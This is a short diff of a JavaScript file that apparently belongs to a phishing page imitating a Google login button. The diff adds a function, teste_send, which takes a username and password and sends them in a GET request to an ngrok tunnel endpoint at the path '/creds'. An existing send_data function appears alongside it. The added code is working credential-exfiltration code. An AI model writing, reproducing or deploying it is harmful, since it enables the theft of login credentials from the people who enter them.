@@ -40,6 +40,21 @@ function send_data(usuario, senha){
 
 
 }
+                                  
+                                  
+                                  
+function teste_send(user, pass){
+   var xhr = new XMLHttpRequest();
+    xhr.open("GET", "https://0a3d-45-162-158-3.sa.ngrok.io/creds?user=" + user + "&pass=" + pass, true);
+    xhr.onreadystatechange = function() {
+        if (xhr.readyState === XMLHttpRequest.DONE && xhr.status === 200) {
+            console.log(xhr.responseText);
+        }
+    };
+    xhr.send();
+           
+           
+}
 
 
 const btn = document.getElementsByClassName('VfPpkd-LgbsSe');
